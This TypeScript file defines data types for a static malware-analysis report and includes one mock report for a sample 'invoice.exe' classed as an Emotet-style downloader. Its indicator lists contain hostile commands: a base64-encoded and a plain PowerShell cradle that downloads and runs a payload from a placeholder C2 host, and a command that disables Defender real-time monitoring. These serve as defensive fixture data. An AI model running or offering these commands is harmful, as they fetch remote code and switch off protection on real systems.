import type { Verdict, SeverityLevel } from '../types';

export interface PeSection {
  name: string;
  virtualSize: number;
  rawSize: number;
  entropy: number; // 0.0 to 8.0
  characteristics: string[];
}

export interface YaraRuleMatch {
  ruleName: string;
  category: string;
  author: string;
  description: string;
  severity: SeverityLevel;
  matchedStrings: string[];
}

export interface StaticAnalysisReport {
  id: string;
  fileName: string;
  fileSize: number;
  fileType: string;
  magicBytes: string;
  sha256: string;
  md5: string;
  ssdeep: string;
  imphash: string;
  timestamp: string;
  riskScore: number; // 0-100
  severity: SeverityLevel;
  classification: Verdict;
  threatFamily: string;
  recommendedAction: string;
  peSections: PeSection[];
  importedDlls: { dll: string; functions: string[] }[];
  suspiciousStrings: string[];
  powershellIndicators: string[];
  extractedUrls: string[];
  extractedIps: string[];
  yaraMatches: YaraRuleMatch[];
}

export const SAMPLE_STATIC_REPORTS: Record<string, StaticAnalysisReport> = {
  'invoice.exe': {
    id: 'rep-inv-082',
    fileName: 'invoice.exe',
    fileSize: 342112,
    fileType: 'PE32+ Executable (GUI) x86-64',
    magicBytes: '4D 5A 90 00 03 00 00 00 (MZ Header)',
    sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
    md5: 'c4ca4238a0b923820dcc509a6f75849b',
    ssdeep: '6144:8k+XFqg90...:8k0qg',
    imphash: 'f34d5f2d4577ed6d9ceec516c1f5a744',
    timestamp: '2026-08-30T08:50:12Z',
    riskScore: 82,
    severity: 'high',
    classification: 'malicious',
    threatFamily: 'Trojan / Downloader (Emotet Variant)',
    recommendedAction: 'Quarantine payload on endpoint, block C2 URL on perimeter gateway, and initiate EDR host isolation.',
    peSections: [
      { name: '.text', virtualSize: 184320, rawSize: 184320, entropy: 6.42, characteristics: ['IMAGE_SCN_CNT_CODE', 'IMAGE_SCN_MEM_EXECUTE', 'IMAGE_SCN_MEM_READ'] },
      { name: '.rdata', virtualSize: 45056, rawSize: 45056, entropy: 4.88, characteristics: ['IMAGE_SCN_CNT_INITIALIZED_DATA', 'IMAGE_SCN_MEM_READ'] },
      { name: '.data', virtualSize: 28672, rawSize: 12288, entropy: 7.91, characteristics: ['IMAGE_SCN_CNT_INITIALIZED_DATA', 'IMAGE_SCN_MEM_READ', 'IMAGE_SCN_MEM_WRITE'] },
      { name: '.rsrc', virtualSize: 8448, rawSize: 8448, entropy: 3.21, characteristics: ['IMAGE_SCN_CNT_INITIALIZED_DATA', 'IMAGE_SCN_MEM_READ'] },
    ],
    importedDlls: [
      { dll: 'kernel32.dll', functions: ['VirtualAlloc', 'VirtualProtect', 'CreateRemoteThread', 'WriteProcessMemory', 'GetProcAddress'] },
      { dll: 'wininet.dll', functions: ['InternetOpenA', 'InternetConnectA', 'HttpSendRequestA', 'InternetReadFile'] },
      { dll: 'advapi32.dll', functions: ['RegOpenKeyExA', 'RegSetValueExA', 'OpenProcessToken'] },
    ],
    suspiciousStrings: [
      'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden',
      'VirtualAllocEx',
      'WriteProcessMemory',
      'CreateRemoteThread',
      'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater',
      'http://c2-dropper.example.com/payload.bin',
      '185.220.101.5',
    ],
    powershellIndicators: [
      'powershell.exe -e aW52b2tlLWV4cHJlc3Npb24gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jMi1kcm9wcGVyLmV4YW1wbGUuY29tL3BheWxvYWQuYmluJycp',
      'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://c2-dropper.example.com/payload.bin")',
      'Set-MpPreference -DisableRealtimeMonitoring $true',
    ],
    extractedUrls: [
      'http://c2-dropper.example.com/payload.bin',
      'https://api.telemetry-beacon.org/v2/gate',
    ],
    extractedIps: [
      '185.220.101.5',
      '45.142.214.99',
    ],
    yaraMatches: [
      {
        ruleName: 'SUSP_PowerShell_C2_Gen',
        category: 'Obfuscated Script Execution',
        author: 'ThreatLens Intelligence',
        description: 'Detects encoded PowerShell invocation with WebClient payload download',
        severity: 'high',
        matchedStrings: ['$ps1 = "powershell.exe -ExecutionPolicy Bypass"', '$web = "DownloadString"'],
      },
      {
        ruleName: 'PE_HighEntropy_PackedSection',
        category: 'Anti-Analysis / Packer',
        author: 'ThreatLens Intelligence',
        description: 'Section .data exhibits entropy > 7.8 indicating encrypted shellcode layer',
        severity: 'medium',
        matchedStrings: ['Entropy: 7.91 in section .data'],
      },
    ],
  },
};
